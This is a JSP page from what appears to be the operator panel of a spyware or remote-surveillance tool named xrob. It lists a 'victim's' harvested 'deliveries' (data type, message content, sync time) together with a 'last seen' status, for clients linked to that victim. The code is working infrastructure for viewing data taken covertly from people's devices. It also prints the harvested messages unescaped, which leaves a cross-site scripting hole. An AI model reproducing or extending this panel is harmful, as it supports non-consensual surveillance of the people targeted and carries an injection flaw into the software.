<%@ page import="com.theah64.xrob.api.database.tables.Deliveries" %>
<%@ page import="com.theah64.xrob.api.database.tables.Victims" %>
<%@ page import="com.theah64.xrob.api.models.Delivery" %>
<%@ page import="com.theah64.xrob.api.models.Victim" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.PathInfo" %>
<%@ page import="java.util.List" %>
<%@ page import="com.theah64.xrob.api.utils.clientpanel.HtmlTemplates" %>
<%@ page import="com.theah64.xrob.api.database.tables.ClientVictimRelations" %>
<%--
  Created by IntelliJ IDEA.
  User: theapache64
  Date: 12/9/16
  Time: 4:08 PM
  To change this template use FileNode | Settings | FileNode Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@include file="../signin_check.jsp" %>

<html>
<head>
  <%

  %>
  <title>Deliveries</title>
  <%@include file="../../common_headers.jsp" %>
  <%
    final HtmlTemplates.SearchTemplate searchTemplate = new HtmlTemplates.SearchTemplate("tDeliveries", "delivery_row");
  %>
  <script>
    $(document).ready(function () {

      <%=searchTemplate.getSearchScript()%>

    });


  </script>
</head>
<body>
<div class="container">

  <%@include file="../header.jsp" %>

  <%
    try {

      final PathInfo pathInfoUtils = new PathInfo(request.getPathInfo(), 1, 1);
      final String victimCode = pathInfoUtils.getPart(1);
      final Victims victimsTable = Victims.getInstance();
      final Victim theVictim = victimsTable.get(Victims.COLUMN_VICTIM_CODE, victimCode);

      if (theVictim != null) {

        if (ClientVictimRelations.getInstance().isConnected(clientId.toString(), theVictim.getId())) {

          final String lastDelivery = Deliveries.getInstance().getLastDeliveryTime(theVictim.getId());

  %>

  <div class="row text-center">
    <ul id="nav_menu" class="breadcrumb">
      <li><a href="/client/panel">Victims</a></li>
      <li><a href="/client/victim/profile/<%=victimCode%>"><%=theVictim.getIdentity()%>
      </a></li>
      <li class="active">Deliveries</li>
    </ul>
  </div>

  <div class="row">

    <div class="row" style="margin-top: 20px;">

      <%
        final List<Delivery> deliveries = Deliveries.getInstance().getAll(theVictim.getId());
        if (deliveries != null) {
      %>
      <div class="col-md-10 content-centered">

        <%=searchTemplate.getTopTemplate(
                theVictim.getIdentity(),
                lastDelivery == null ? "(Not yet seen)" : "(last seen: " + lastDelivery + ")")%>

        <table id="tDeliveries" class="table table-bordered table-condensed">
          <tr>
            <th>Type</th>
            <th>Message</th>
            <th>Synced</th>
          </tr>

          <%
            for (final Delivery delivery : deliveries) {
          %>
          <tr class="delivery_row">
            <td><%=delivery.getDataType()%>
            </td>
            <td><%=delivery.getMessage()%>
            </td>
            <td><%=delivery.getRelativeSyncTime()%>
            </td>
          </tr>
          <%
            }
          %>

        </table>
      </div>
      <%
        } else {
          throw new PathInfo.PathInfoException("No delivery found!");
        }
      %>

    </div>

    <%

      } else {

        throw new PathInfo.PathInfoException("No connection established with this victim");
      }

    %>
  </div>
  <%
    } else {
      throw new PathInfo.PathInfoException("Invalid victim code");
    }
  } catch (PathInfo.PathInfoException e) {
    e.printStackTrace();
  %>
  <%=HtmlTemplates.getErrorHtml(e.getMessage())%>
  <%
    }
  %>

</div>
</body>
</html>
